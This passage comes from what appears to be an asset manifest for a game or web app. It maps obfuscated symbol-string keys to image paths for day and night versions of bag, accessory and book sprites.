			"ⵠΔⵠᐃΔⲆΔ": "img/day-bag8.png",
			"ⵠᐃⵠΔΔΔⲆ": "img/night-bag8.png",
			"ΔⲆⲆᐃᐃΔᐃ": "img/day-bag9.png",
			"ⵠⲆᐃΔⵠⵠⵠ": "img/night-bag9.png",
			"ⵠⵠᐃΔⵠⵠⲆ": "img/day-bag10.png",
			"ⵠⲆⵠΔΔⲆΔ": "img/night-bag10.png",
			"ⵠⲆⵠᐃⵠΔⵠ": "img/day-bag11.png",
			"ⵠⲆⵠⵠΔⲆΔ": "img/night-bag11.png",
			"ᐃᐃΔᐃΔⲆΔ": "img/day-bag13.png",
			"ⵠⲆᐃⵠᐃⲆΔ": "img/night-bag13.png",
			"ⲆᐃΔΔⵠⵠΔ": "img/day-bag14.png",
			"ⲆᐃⵠⵠᐃⲆⵠ": "img/night-bag14.png",
			"ⵠΔⲆΔⵠᐃΔ": "img/day-bag16.png",
			"ⵠⲆΔΔᐃⲆⵠ": "img/night-bag16.png",
			"ᐃΔⲆΔΔⵠⵠ": "img/day-bag17.png",
			"ⵠΔⲆⵠΔᐃⵠ": "img/night-bag17.png",
			"ᐃᐃⲆΔⵠΔΔ": "img/day-bag18.png",
			"ⵠᐃⲆⵠⲆⲆᐃ": "img/night-bag18.png",
			"ᐃⵠⵠⲆΔΔⵠ": "img/day-bag19.png",
			"ᐃⵠⵠΔᐃᐃⵠ": "img/night-bag19.png",
			"ⲆΔᐃᐃΔΔⵠ": "img/day-bag20.png",
			"ΔΔΔⵠⲆⲆᐃ": "img/night-bag20.png",
			"ᐃⲆⵠΔⲆⲆⲆ": "img/day-bag21.png",
			"ⵠⵠⵠⲆⵠᐃⲆ": "img/night-bag21.png",
			"ⵠΔΔᐃⲆⲆⲆ": "img/day-bag22.png",
			"ΔΔⲆΔΔΔΔ": "img/night-bag22.png",
			"ΔⲆᐃΔΔΔⵠ": "img/day-bag23.png",
			"ΔⵠᐃᐃⲆⲆⲆ": "img/night-bag23.png",
			"ⵠⵠᐃᐃⵠᐃᐃ": "img/day-bag24.png",
			"ⲆΔⲆᐃⲆΔΔ": "img/night-bag24.png",
			"ⲆⵠⵠΔⵠⲆⲆ": "img/day-bag25.png",
			"ⵠⲆᐃⵠⲆΔᐃ": "img/night-bag25.png",
			"ⵠΔⲆⵠΔⵠΔ": "img/day-bag26.png",
			"ⲆᐃΔΔⵠᐃⲆ": "img/night-bag26.png",
			"ᐃΔΔⲆᐃⵠⲆ": "img/day-bag27.png",
			"ᐃⵠᐃⵠᐃⲆⲆ": "img/night-bag27.png",
			"ⲆⲆΔⵠᐃᐃΔ": "img/day-bag28.png",
			"ΔⲆᐃᐃⵠⵠⵠ": "img/night-bag28.png",
			"ⵠΔⲆΔⲆΔⲆ": "img/day-bag29.png",
			"ⵠΔⵠΔᐃⵠΔ": "img/night-bag29.png",
			"ΔΔΔⵠⵠᐃΔ": "img/day-bag30.png",
			"ᐃΔⵠⲆⵠⲆⲆ": "img/night-bag30.png",
			"ⲆⲆⲆΔⲆⵠⲆ": "img/day-bag31.png",
			"ⵠΔⲆΔⲆᐃⵠ": "img/night-bag31.png",
			"ᐃΔΔⲆⲆᐃⵠ": "img/day-bag32.png",
			"ⲆⲆᐃⲆᐃΔⵠ": "img/night-bag32.png",
			"ΔᐃᐃΔᐃⵠⵠ": "img/day-bag33.png",
			"ⵠⵠⵠΔⵠᐃⵠ": "img/night-bag33.png",
			"ᐃⵠᐃⲆⵠⲆᐃ": "img/day-bag34.png",
			"ⲆᐃΔⲆΔⵠᐃ": "img/night-bag34.png",
			"ⲆΔⵠᐃⵠΔⵠ": "img/day-bag35.png",
			"ⵠⵠⵠⲆᐃⵠΔ": "img/night-bag35.png",
			"ⲆⵠⵠⵠΔⲆⵠ": "img/day-bag36.png",
			"ⲆΔΔⵠΔⵠⲆ": "img/night-bag36.png",
			"ΔΔᐃⲆΔⲆᐃ": "img/day-bag37.png",
			"ΔΔⵠᐃⲆΔΔ": "img/night-bag37.png",
			"ⵠᐃⲆⵠᐃΔⲆ": "img/day-bag38.png",
			"ⲆⵠⵠⵠΔⲆⲆ": "img/night-bag38.png",
			"ⲆᐃᐃΔⵠⲆΔ": "img/day-bag39.png",
			"ⲆⲆΔᐃᐃⲆⵠ": "img/night-bag39.png",
			"ⵠⵠⵠⲆⲆⵠᐃ": "img/day-bag40.png",
			"ΔⵠΔⲆΔⵠᐃ": "img/night-bag40.png",
			"ⵠΔΔⲆⵠᐃᐃ": "img/day-bag41.png",
			"ᐃᐃᐃΔⵠⵠᐃ": "img/night-bag41.png",
			"ᐃᐃⵠᐃΔΔⵠ": "img/day-bag42.png",
			"ⲆⵠⵠⵠⲆᐃΔ": "img/night-bag42.png",
			"ⵠⲆΔΔΔⵠᐃ": "img/day-bag43.png",
			"ⵠᐃᐃΔᐃⲆΔ": "img/night-bag43.png",
			"ⲆⵠⵠⲆⵠⵠⵠ": "img/day-bag44.png",
			"ᐃⵠⲆⲆⲆΔΔ": "img/night-bag44.png",
			"ⲆᐃⵠⵠⵠᐃΔ": "img/day-bag45.png",
			"ⲆⵠΔΔⵠⵠⵠ": "img/night-bag45.png",
			"ᐃⵠᐃΔΔⲆⲆ": "img/day-bag46.png",
			"ⲆⵠⲆΔᐃΔΔ": "img/night-bag46.png",
			"ⵠⵠᐃⲆΔⲆⵠ": "img/day-bag47.png",
			"ⲆΔΔᐃⲆᐃᐃ": "img/night-bag47.png",
			"ᐃᐃᐃⵠⲆᐃⲆ": "img/day-bag48.png",
			"ΔⵠⲆⲆᐃⵠᐃ": "img/night-bag48.png",
			"ΔⲆⲆⵠΔᐃⲆ": "img/day-bag49.png",
			"ᐃᐃΔⲆᐃⵠΔ": "img/night-bag49.png",
			"ⵠᐃΔⲆⲆΔᐃ": "img/day-bag50.png",
			"ⲆⲆⲆⵠΔⵠⵠ": "img/night-bag50.png",
			"ⵠΔⲆⲆⲆΔΔ": "img/day-bag51.png",
			"ⲆⵠⲆΔⵠᐃΔ": "img/night-bag51.png",
			"ⲆΔⲆᐃⵠⵠΔ": "img/day-bag52.png",
			"ΔⲆᐃⵠΔΔΔ": "img/night-bag52.png",
			"ᐃᐃᐃΔⲆΔⵠ": "img/day-bag53.png",
			"ᐃⲆᐃⲆⲆⵠΔ": "img/night-bag53.png",
			"ⵠⲆΔⵠΔΔΔ": "img/day-bag54.png",
			"ⲆⲆⵠⲆᐃⵠⵠ": "img/night-bag54.png",
			"ⲆΔⵠᐃΔⵠⲆ": "img/day-bag55.png",
			"ᐃⵠⵠⵠⲆⲆΔ": "img/night-bag55.png",
			"ⲆⲆⲆⲆᐃⵠⵠ": "img/day-bag56.png",
			"ΔᐃΔΔᐃΔΔ": "img/night-bag56.png",
			"ΔⵠΔⲆⲆΔᐃ": "img/day-bag57.png",
			"ᐃⲆⵠΔⲆⲆᐃ": "img/night-bag57.png",
			"ΔⲆⲆⵠᐃⵠⲆ": "img/day-bag58.png",
			"ⵠΔᐃⵠΔΔⲆ": "img/night-bag58.png",
			"ⵠⵠᐃΔᐃᐃⲆ": "img/day-bag59.png",
			"ⲆⵠΔⲆΔᐃᐃ": "img/night-bag59.png",
			"ⵠⵠⵠⵠΔΔΔ": "img/day-bag60.png",
			"ⵠⲆΔᐃⲆΔΔ": "img/night-bag60.png",
			"ⵠΔⲆⲆⵠⵠⲆ": "img/day-bag61.png",
			"ΔⲆᐃΔⲆΔΔ": "img/night-bag61.png",
			"ⲆᐃᐃᐃⵠᐃΔ": "img/day-bag62.png",
			"ⵠᐃⲆⵠΔᐃΔ": "img/night-bag62.png",
			"ΔⲆᐃⲆⲆⵠΔ": "img/day-bag63.png",
			"ⵠⵠⵠᐃᐃΔⲆ": "img/night-bag63.png",
			"ⲆᐃΔⲆⵠⵠΔ": "img/day-bag64.png",
			"ᐃΔΔⲆΔᐃⲆ": "img/night-bag64.png",
			"ⵠᐃⵠⵠⵠⵠᐃ": "img/day-bag65.png",
			"ⵠᐃΔⵠΔⲆᐃ": "img/night-bag65.png",
			"ΔΔⲆⵠᐃⲆⵠ": "img/day-bag66.png",
			"ᐃᐃᐃⵠⲆᐃᐃ": "img/night-bag66.png",
			"ᐃᐃⵠⲆᐃᐃᐃ": "img/day-bag67.png",
			"Ⲇᐃᐃⵠⵠⵠᐃ": "img/night-bag67.png",
			"ⲆᐃⵠᐃⵠΔᐃ": "img/day-bag68.png",
			"ᐃΔⲆᐃᐃᐃⲆ": "img/night-bag68.png",
			"ⲆⵠⵠΔⲆᐃⵠ": "img/day-bag69.png",
			"ᐃᐃⲆΔᐃΔᐃ": "img/night-bag69.png",
			"ΔⲆΔⵠⲆⲆⵠ": "img/day-bag70.png",
			"ⵠⲆⲆⵠⲆⲆⲆ": "img/night-bag70.png",
			"ΔⵠᐃⵠΔΔⲆ": "img/day-bag71.png",
			"ⵠⲆΔⵠᐃⵠᐃ": "img/night-bag71.png",
			"ⵠⵠⲆⵠΔⵠᐃ": "img/day-bag72.png",
			"ᐃⲆⲆⲆΔⵠΔ": "img/night-bag72.png",
			"ⲆᐃⵠⵠⵠⲆⲆ": "img/day-bag73.png",
			"ΔᐃΔΔΔⲆᐃ": "img/night-bag73.png",
			"ⵠⲆᐃΔᐃⵠΔ": "img/day-bag74.png",
			"ⲆⵠᐃΔⲆΔΔ": "img/night-bag74.png",
			"ⲆⲆⲆⲆᐃΔᐃ": "img/day-bag75.png",
			"ⵠⵠΔⵠΔⲆⲆ": "img/night-bag75.png",
			"ᐃᐃΔⲆⲆⵠⲆ": "img/day-bag76.png",
			"ⵠⲆⲆⲆⲆᐃᐃ": "img/night-bag76.png",
			"ᐃⵠΔᐃⲆⵠⵠ": "img/day-bag77.png",
			"ⵠᐃⲆᐃⲆⲆᐃ": "img/night-bag77.png",
			"ᐃᐃᐃΔΔⲆΔ": "img/day-bag78.png",
			"ΔᐃⵠⲆⵠⵠΔ": "img/night-bag78.png",
			"ⵠⵠᐃᐃΔⲆⵠ": "img/day-bag79.png",
			"ΔⲆᐃᐃⵠⲆᐃ": "img/night-bag79.png",
			"ΔⵠΔᐃΔΔΔ": "img/day-bag80.png",
			"ⲆᐃᐃᐃΔⵠΔ": "img/night-bag80.png",
			"ᐃⵠⲆᐃⵠⵠⵠ": "img/day-accessory0.png",
			"ⲆᐃⵠᐃⵠΔⲆ": "img/day-accessory0-pacques.png",
			"ⵠᐃⲆⲆΔΔᐃ": "img/night-accessory0-pacques.png",
			"ⲆΔⲆᐃⵠⲆⲆ": "img/day-accessory13.png",
			"ᐃᐃΔᐃΔⵠᐃ": "img/night-accessory13.png",
			"ⵠⲆᐃⵠΔᐃⵠ": "img/day-accessory14.png",
			"ΔΔᐃᐃⲆⵠᐃ": "img/night-accessory14.png",
			"ⵠᐃⲆⵠⲆⲆⲆ": "img/day-accessory15.png",
			"ΔΔⵠΔΔⲆΔ": "img/night-accessory15.png",
			"ᐃⲆⵠᐃΔⵠΔ": "img/day-accessory16.png",
			"ΔᐃΔΔⵠⲆⵠ": "img/night-accessory16.png",
			"ᐃⵠⵠⵠΔⵠⵠ": "img/day-accessory17.png",
			"ⲆⵠᐃΔᐃⲆᐃ": "img/day-accessory17.png",
			"ΔΔⵠΔⲆᐃΔ": "img/day-accessory19.png",
			"ΔⲆᐃⵠⵠᐃⲆ": "img/night-accessory19.png",
			"ᐃⵠᐃΔⵠΔⲆ": "img/day-accessory20.png",
			"ΔⵠⲆΔΔⲆⵠ": "img/night-accessory20.png",
			"ΔⲆⵠⲆⲆΔⲆ": "img/day-accessory21.png",
			"ᐃⵠⵠΔᐃᐃⲆ": "img/night-accessory21.png",
			"ᐃⲆᐃΔΔⵠΔ": "img/day-accessory22.png",
			"ΔᐃΔⲆⵠⲆⲆ": "img/night-accessory22.png",
			"ⲆᐃΔΔⲆᐃΔ": "img/day-accessory23.png",
			"ⲆⵠᐃⵠΔᐃᐃ": "img/night-accessory23.png",
			"ⵠᐃⵠΔⲆⲆΔ": "img/day-accessory24.png",
			"ᐃᐃᐃⵠⲆΔⲆ": "img/night-accessory24.png",
			"ⲆᐃⲆᐃⲆΔⵠ": "img/day-accessory25.png",
			"ⲆΔⲆⵠΔⵠΔ": "img/night-accessory25.png",
			"ΔΔΔΔᐃᐃᐃ": "img/day-accessory26.png",
			"ᐃⵠⲆΔⲆⲆΔ": "img/night-accessory26.png",
			"ΔᐃΔᐃᐃᐃΔ": "img/day-accessory27.png",
			"ΔⲆⵠᐃΔΔⵠ": "img/night-accessory27.png",
			"ᐃⲆⲆⲆⲆᐃⲆ": "img/day-accessory18.png",
			"ⵠⲆⵠⵠᐃⲆΔ": "img/night-accessory18.png",
			"ⲆⲆⵠΔⵠΔᐃ": "img/day-accessory29.png",
			"ᐃᐃᐃⵠᐃᐃⲆ": "img/night-accessory29.png",
			"ⲆΔΔⲆⲆⲆⵠ": "img/day-accessory30.png",
			"ⲆⲆⵠⲆⲆⲆⵠ": "img/night-accessory30.png",
			"ᐃⵠⲆΔΔΔᐃ": "img/day-accessory31.png",
			"ⵠⵠᐃⵠΔⵠᐃ": "img/night-accessory31.png",
			"Δᐃⵠⵠᐃᐃⵠ": "img/day-accessory32.png",
			"ⲆΔΔⵠⵠⵠΔ": "img/night-accessory32.png",
			"ⵠᐃⲆⵠⲆᐃⵠ": "img/day-accessory33.png",
			"ΔΔⵠⵠⲆᐃⲆ": "img/night-accessory33.png",
			"ⲆΔⵠΔΔⲆⵠ": "img/day-accessory34.png",
			"ⲆΔᐃⵠⲆΔⵠ": "img/night-accessory34.png",
			"ΔⵠⵠⲆᐃⲆᐃ": "img/day-accessory35.png",
			"ⵠⵠΔᐃⵠⵠⲆ": "img/night-accessory35.png",
			"ⲆᐃⵠⵠⵠΔΔ": "img/day-accessory28.png",
			"ΔⲆⲆⲆⲆⲆΔ": "img/night-accessory28.png",
			"ΔᐃⲆⵠᐃⵠᐃ": "img/day-accessory36.png",
			"ⲆΔⲆⵠⵠᐃᐃ": "img/night-accessory36.png",
			"ΔⲆΔⵠΔⲆΔ": "img/day-accessory37.png",
			"ᐃⲆⵠⵠⵠᐃᐃ": "img/night-accessory37.png",
			"ΔᐃⲆⵠⲆΔⵠ": "img/day-accessory39.png",
			"ⲆᐃⵠⵠⲆⲆⲆ": "img/night-accessory39.png",
			"ⲆᐃⲆΔⵠᐃⵠ": "img/day-accessory40.png",
			"ᐃΔⵠⵠᐃΔᐃ": "img/night-accessory40.png",
			"ΔᐃⲆΔⵠᐃⲆ": "img/day-accessory41.png",
			"ⵠΔΔⵠⵠΔᐃ": "img/night-accessory41.png",
			"ΔΔΔⵠⵠᐃⲆ": "img/day-accessory42.png",
			"ΔΔᐃᐃΔᐃΔ": "img/night-accessory42.png",
			"ⲆΔⵠᐃᐃⲆᐃ": "img/day-accessory43.png",
			"ΔⲆᐃᐃᐃⲆΔ": "img/night-accessory43.png",
			"ⲆⲆⲆⲆΔΔⲆ": "img/day-accessory44.png",
			"ΔⲆΔΔᐃᐃΔ": "img/night-accessory44.png",
			"ⵠⲆᐃⲆⵠᐃⲆ": "img/day-accessory38.png",
			"Δⵠⵠᐃⵠⵠⵠ": "img/night-accessory38.png",
			"ⲆⵠⵠⲆⵠⲆΔ": "img/day-accessory46.png",
			"ⵠᐃΔΔⵠⲆΔ": "img/night-accessory46.png",
			"ⲆⲆΔⵠΔΔⵠ": "img/day-accessory47.png",
			"ΔΔⲆᐃⲆⲆⲆ": "img/night-accessory47.png",
			"ΔᐃᐃⲆⵠⵠΔ": "img/day-accessory48.png",
			"ᐃΔⲆⵠΔᐃΔ": "img/night-accessory48.png",
			"ⲆⲆᐃⲆⲆᐃΔ": "img/day-accessory49.png",
			"ⲆⲆⲆⵠⲆΔⵠ": "img/night-accessory49.png",
			"ᐃⲆΔᐃΔⵠⲆ": "img/day-accessory45.png",
			"ⲆⵠᐃΔᐃⲆΔ": "img/night-accessory45.png",
			"ᐃⵠⵠᐃΔΔⵠ": "img/day-accessory50.png",
			"ⲆⲆᐃⲆⲆⲆᐃ": "img/night-accessory50.png",
			"ⲆΔⲆΔⵠⵠΔ": "img/day-accessory51.png",
			"ᐃⵠⵠΔⲆⵠᐃ": "img/night-accessory51.png",
			"ΔⲆΔᐃⵠᐃᐃ": "img/day-accessory52.png",
			"ΔⲆⲆΔⲆΔΔ": "img/night-accessory52.png",
			"ΔᐃⵠⲆⵠⲆᐃ": "img/day-accessory53.png",
			"ⲆⲆⲆΔⵠᐃΔ": "img/night-accessory53.png",
			"ᐃⲆΔⵠᐃᐃΔ": "img/day-accessory54.png",
			"ᐃΔⵠᐃΔⵠᐃ": "img/night-accessory54.png",
			"ᐃΔⵠⵠΔᐃⲆ": "img/day-accessory55.png",
			"ⵠΔᐃΔⲆΔⵠ": "img/night-accessory55.png",
			"ΔᐃΔⲆΔᐃⲆ": "img/day-accessory56.png",
			"ⵠᐃⵠΔΔᐃⲆ": "img/night-accessory56.png",
			"ᐃᐃΔⲆⵠⵠᐃ": "img/day-accessory57.png",
			"ΔⲆᐃⲆⲆⲆᐃ": "img/night-accessory57.png",
			"ΔⲆⲆⵠΔΔΔ": "img/day-accessory58.png",
			"ⲆⵠᐃⵠΔΔⵠ": "img/night-accessory58.png",
			"ⲆⵠⲆΔΔΔⲆ": "img/day-accessory59.png",
			"ᐃⵠΔᐃΔⵠΔ": "img/night-accessory59.png",
			"ᐃⲆⵠΔᐃⵠΔ": "img/day-accessory60.png",
			"ΔⵠᐃⲆΔΔⲆ": "img/night-accessory60.png",
			"ᐃⵠⲆΔⵠΔⲆ": "img/day-accessory61.png",
			"ⲆΔΔΔⵠᐃᐃ": "img/night-accessory61.png",
			"ⵠⲆΔᐃⲆᐃᐃ": "img/day-accessory62.png",
			"ᐃⲆⵠΔⵠᐃᐃ": "img/night-accessory62.png",
			"ΔⲆΔΔᐃⲆⵠ": "img/day-accessory63.png",
			"ⲆⲆᐃⲆΔⵠΔ": "img/night-accessory63.png",
			"ⲆΔΔᐃΔⲆⵠ": "img/day-accessory64.png",
			"ΔᐃΔⲆⲆᐃⵠ": "img/night-accessory64.png",
			"ΔⲆᐃⵠΔⵠᐃ": "img/day-accessory65.png",
			"ΔᐃᐃⲆΔⵠⲆ": "img/night-accessory65.png",
			"ⵠΔⵠΔⲆⲆⵠ": "img/day-accessory66.png",
			"ᐃΔⲆⲆΔⲆⲆ": "img/night-accessory66.png",
			"ΔΔⲆΔΔΔⲆ": "img/day-accessory67.png",
			"ⲆⵠⵠΔⵠᐃΔ": "img/night-accessory67.png",
			"ᐃⵠⵠΔⲆⲆⲆ": "img/day-accessory68.png",
			"ΔᐃⲆⵠⵠⵠⵠ": "img/night-accessory68.png",
			"ᐃⵠᐃᐃⲆⵠⲆ": "img/day-accessory69.png",
			"ⵠⲆⲆᐃⲆⵠΔ": "img/night-accessory69.png",
			"ⵠΔΔΔⵠⵠⵠ": "img/day-accessory70.png",
			"ⵠΔᐃΔⵠᐃᐃ": "img/night-accessory70.png",
			"ᐃΔΔⵠΔᐃᐃ": "img/day-accessory71.png",
			"ΔⲆΔⵠᐃᐃⲆ": "img/night-accessory71.png",
			"ⲆᐃᐃΔΔᐃⵠ": "img/day-accessory72.png",
			"ⵠⵠⲆⲆⲆΔⵠ": "img/night-accessory72.png",
			"ΔᐃⲆᐃⵠΔⵠ": "img/day-accessory73.png",
			"ⲆⲆⲆΔⵠΔΔ": "img/night-accessory73.png",
			"ⲆΔᐃᐃᐃⵠΔ": "img/day-accessory74.png",
			"ⲆᐃⲆⵠΔΔⵠ": "img/night-accessory74.png",
			"ᐃⲆⲆᐃⵠⵠᐃ": "img/day-accessory75.png",
			"ⲆⵠΔⲆᐃⵠΔ": "img/night-accessory75.png",
			"ΔᐃⵠᐃᐃⵠⲆ": "img/day-accessory76.png",
			"ᐃⵠΔΔΔᐃᐃ": "img/night-accessory76.png",
			"ⵠᐃⵠᐃⵠΔᐃ": "img/day-accessory77.png",
			"ⵠⲆᐃᐃᐃⵠᐃ": "img/night-accessory77.png",
			"ⲆⲆⵠⲆⵠᐃᐃ": "img/day-accessory78.png",
			"ᐃⲆᐃⵠⵠⲆᐃ": "img/night-accessory78.png",
			"ΔⵠᐃΔⵠⲆⵠ": "img/day-accessory79.png",
			"ᐃⵠᐃᐃⲆᐃᐃ": "img/night-accessory79.png",
			"ⲆΔⵠⵠⲆΔᐃ": "img/day-accessory80.png",
			"ΔⲆᐃᐃⲆⵠⵠ": "img/night-accessory80.png",
			"ⲆᐃΔᐃᐃᐃΔ": "img/day-accessory81.png",
			"ⲆᐃⲆⵠΔᐃΔ": "img/night-accessory81.png",
			"ᐃΔΔⲆⲆᐃᐃ": "img/day-accessory83.png",
			"ⲆⲆΔᐃⵠΔⲆ": "img/night-accessory83.png",
			"ⵠᐃⵠΔᐃᐃⵠ": "img/day-accessory84.png",
			"ᐃᐃΔⵠⲆⲆΔ": "img/night-accessory84.png",
			"ΔⵠⲆⲆⲆⲆⵠ": "img/day-accessory85.png",
			"ⵠᐃⵠᐃΔⵠⵠ": "img/night-accessory85.png",
			"ΔⵠᐃΔΔᐃᐃ": "img/day-accessory86.png",
			"ᐃᐃᐃⵠⲆⲆᐃ": "img/night-accessory86.png",
			"ΔΔⵠⵠΔΔᐃ": "img/day-accessory87.png",
			"ΔⵠⵠᐃⵠΔⵠ": "img/night-accessory87.png",
			"ⲆⲆⲆᐃⵠⵠⵠ": "img/day-accessory88.png",
			"ⲆⵠⵠᐃᐃⲆΔ": "img/night-accessory88.png",
			"ⵠΔⵠΔⲆᐃⲆ": "img/day-accessory89.png",
			"ᐃΔⲆᐃᐃⵠΔ": "img/night-accessory89.png",
			"ⵠΔᐃᐃᐃΔⵠ": "img/day-accessory90.png",
			"ΔΔⵠⵠⵠⲆⲆ": "img/night-accessory90.png",
			"ΔⵠⲆⲆΔΔⵠ": "img/day-accessory91.png",
			"ⲆᐃᐃⵠᐃᐃΔ": "img/night-accessory91.png",
			"ᐃⲆᐃⵠⵠᐃᐃ": "img/day-accessory92.png",
			"ΔᐃⲆΔᐃⵠΔ": "img/night-accessory92.png",
			"ⵠⲆᐃᐃⵠᐃᐃ": "img/day-accessory93.png",
			"ⵠⵠⲆⵠⲆᐃΔ": "img/night-accessory93.png",
			"ⵠΔⵠΔⵠᐃΔ": "img/day-accessory94.png",
			"ⵠΔⵠᐃᐃⵠⵠ": "img/night-accessory94.png",
			"ⲆᐃⵠⵠⲆⲆᐃ": "img/day-accessory95.png",
			"ⵠⵠⵠΔᐃⲆⵠ": "img/night-accessory95.png",
			"ⵠΔΔΔᐃᐃᐃ": "img/day-accessory96.png",
			"ᐃᐃᐃⲆⲆⵠⲆ": "img/night-accessory96.png",
			"ⲆⵠᐃᐃⵠΔΔ": "img/day-accessory97.png",
			"ᐃⲆᐃⵠᐃΔᐃ": "img/night-accessory97.png",
			"ⵠᐃⲆⲆᐃΔⲆ": "img/day-accessory98.png",
			"ΔⵠⲆⵠᐃⵠⵠ": "img/night-accessory98.png",
			"ΔⲆⲆⲆⵠᐃΔ": "img/day-accessory99.png",
			"ΔⲆⲆⵠⲆΔΔ": "img/night-accessory99.png",
			"ⲆⲆᐃⲆᐃᐃⵠ": "img/day-accessory100.png",
			"ⵠⵠᐃᐃⲆᐃⵠ": "img/night-accessory100.png",
			"ΔᐃⵠⵠΔΔⵠ": "img/day-accessory101.png",
			"ⵠΔⵠᐃⵠᐃΔ": "img/night-accessory101.png",
			"ⵠⲆᐃᐃΔᐃⵠ": "img/day-accessory102.png",
			"ΔⵠⵠΔΔⵠΔ": "img/night-accessory102.png",
			"ᐃΔⵠᐃᐃⲆᐃ": "img/day-accessory103.png",
			"ⵠΔΔⲆⲆⲆⵠ": "img/night-accessory103.png",
			"ᐃⵠⲆΔⵠΔⵠ": "img/day-accessory104.png",
			"ᐃⲆⲆΔⵠⲆⵠ": "img/night-accessory104.png",
			"ⵠᐃⲆΔⲆᐃᐃ": "img/day-accessory105.png",
			"ⵠᐃΔⲆΔⲆⵠ": "img/night-accessory105.png",
			"ⵠⲆᐃᐃᐃⲆΔΔΔ": "img/day-accessory106.png",
			"ⲆᐃⲆΔΔᐃᐃⲆⲆ": "img/night-accessory106.png",
			"ⵠⲆⲆⲆᐃⲆᐃⵠⲆ": "img/day-accessory107.png",
			"ⵠⵠⲆⲆᐃΔᐃᐃⵠ": "img/night-accessory107.png",
			"ⲆⲆⲆΔⵠΔⵠ": "img/day-accessory82.png",
			"ΔᐃⵠᐃⲆᐃᐃ": "img/night-accessory82.png",
			"ᐃΔⲆⵠΔΔᐃ": "img/day-book0.png",
			"ⵠΔᐃᐃⵠⲆᐃ": "img/night-book0.png",
			"ⲆⲆΔΔⵠᐃᐃ": "img/day-book1.png",
			"ΔⵠⲆᐃΔⵠΔ": "img/night-book1.png",
			"ⲆΔⵠᐃⵠⲆΔ": "img/day-book2.png",
			"ⲆⵠΔΔⵠᐃᐃ": "img/night-book2.png",
			"ᐃᐃⵠⲆΔⵠⲆ": "img/day-book3.png",
			"ᐃᐃⲆᐃⵠᐃᐃ": "img/night-book3.png",
			"ᐃⲆᐃⵠᐃⵠⲆ": "img/day-book4.png",
			"ⵠᐃΔᐃᐃⲆᐃ": "img/night-book4.png",
			"ⵠⵠⵠΔᐃⵠⵠ": "img/day-book5.png",
			"ΔᐃⲆᐃΔⲆⲆ": "img/night-book5.png",
			"ⵠⲆᐃⲆⲆΔⲆ": "img/day-book6.png",
			"ⵠΔᐃᐃⲆᐃⵠ": "img/night-book6.png",
			"ΔΔΔᐃΔΔⲆ": "img/day-book7.png",
			"ᐃⲆΔⲆⵠᐃᐃ": "img/night-book7.png",
			"ᐃⵠⵠⲆⲆⵠⲆ": "img/day-book8.png",
			"ΔⲆⵠᐃΔⵠᐃ": "img/night-book8.png",
			"ⲆⵠⲆⵠᐃᐃⵠ": "img/day-book9.png",
			"ΔⲆᐃΔⵠᐃⵠ": "img/night-book9.png",
			"ΔⲆΔᐃΔⵠΔ": "img/day-book10.png",
			"ΔᐃΔᐃᐃΔΔ": "img/night-book10.png",
			"ᐃⵠᐃᐃᐃⵠⲆ": "img/day-book11.png",
			"ⵠᐃΔᐃⵠⵠᐃ": "img/night-book11.png",
			"ᐃΔᐃΔᐃΔⲆ": "img/day-book12.png",
			"ΔⲆᐃⲆⲆᐃΔ": "img/night-book12.png",
			"ΔⲆΔⲆⵠΔΔ": "img/day-book13.png",
			"ⵠⲆⲆⵠᐃⵠⵠ": "img/night-book13.png",
			"ⲆΔⲆⵠᐃΔᐃ": "img/day-book14.png",
			"ⵠⲆΔΔᐃⲆᐃ": "img/night-book14.png",
			"ⵠⲆΔᐃᐃⲆΔ": "img/day-book15.png",
			"ⵠⵠⵠⵠⵠΔΔ": "img/night-book15.png",
			"ᐃᐃⵠⵠⲆⵠⲆ": "img/day-book16.png",
			"ᐃΔᐃⵠᐃⵠΔ": "img/night-book16.png",
			"ⲆΔⵠᐃⵠΔΔ": "img/day-book17.png",
			"ⵠⵠᐃΔᐃⵠΔ": "img/night-book17.png",
			"ⵠⲆⵠⲆΔⲆⵠ": "img/day-book18.png",
			"ⲆⲆⵠΔⵠⵠⲆ": "img/night-book18.png",
			"ΔᐃⵠⵠⲆⲆⲆ": "img/day-book19.png",
			"ᐃⲆⲆᐃΔⲆΔ": "img/night-book19.png",
			"ⲆⲆΔⲆⵠᐃΔ": "img/day-book20.png",
			"ⵠⵠⵠΔⲆΔⵠ": "img/night-book20.png",
			"ΔⲆᐃᐃⵠᐃⲆ": "img/day-book21.png",
			"ⵠⵠⵠⵠⵠⵠⵠ": "img/night-book21.png",
			"ΔΔⲆᐃΔⲆⵠ": "img/day-book22.png",
			"ⲆⵠΔᐃⲆΔⲆ": "img/night-book22.png",
			"ⲆⲆΔᐃⲆΔΔ": "img/day-book23.png",
			"ⵠᐃᐃᐃΔⲆⲆ": "img/night-book23.png",
			"ⲆΔᐃᐃⲆⵠⵠ": "img/day-book24.png",
			"ⵠⲆⲆΔᐃⵠᐃ": "img/night-book24.png",
			"ΔᐃΔⵠⵠⲆᐃ": "img/day-book25.png",
			"ᐃⵠᐃⲆⲆⵠΔ": "img/night-book25.png",
			"ⲆⲆⵠⲆΔⵠⵠ": "img/day-book26.png",
			"ᐃⲆΔⲆⲆΔᐃ": "img/night-book26.png",
			"ᐃᐃⲆΔⵠΔᐃ": "img/day-book27.png",
			"ⵠⵠⲆⵠⵠⵠⵠ": "img/night-book27.png",
			"ΔⵠᐃⲆⲆΔⲆ": "img/day-book28.png",
			"ᐃⵠⲆⵠⵠⵠⵠ": "img/night-book28.png",
			"ΔⵠⵠⵠΔΔⲆ": "img/day-book29.png",
			"ⵠΔⵠⵠᐃΔΔ": "img/night-book29.png",
			"ⲆⵠⵠᐃⲆⵠⵠ": "img/day-book30.png",
			"ⲆⲆⲆⲆⵠᐃΔ": "img/night-book30.png",
			"ΔⲆⵠⵠΔᐃΔ": "img/day-book31.png",
			"ⵠᐃⲆᐃᐃᐃᐃ": "img/night-book31.png",
			"ⵠⲆᐃΔΔᐃΔ": "img/day-book32.png",
			"ⵠᐃⵠⲆⵠⵠⵠ": "img/night-book32.png",
			"ⵠΔᐃΔᐃᐃⲆ": "img/day-book33.png",
			"ΔᐃⵠΔⵠᐃᐃ": "img/night-book33.png",
			"ᐃⵠᐃᐃᐃΔᐃ": "img/day-book34.png",
			"ᐃⲆⵠⵠΔᐃΔ": "img/night-book34.png",
			"ⵠΔΔᐃᐃΔΔ": "img/day-book35.png",
			"ⵠⲆⲆⵠⵠΔⲆ": "img/night-book35.png",
			"ᐃΔᐃⵠⲆⵠⵠ": "img/day-book36.png",
			"ⲆᐃΔΔΔᐃⵠ": "img/night-book36.png",
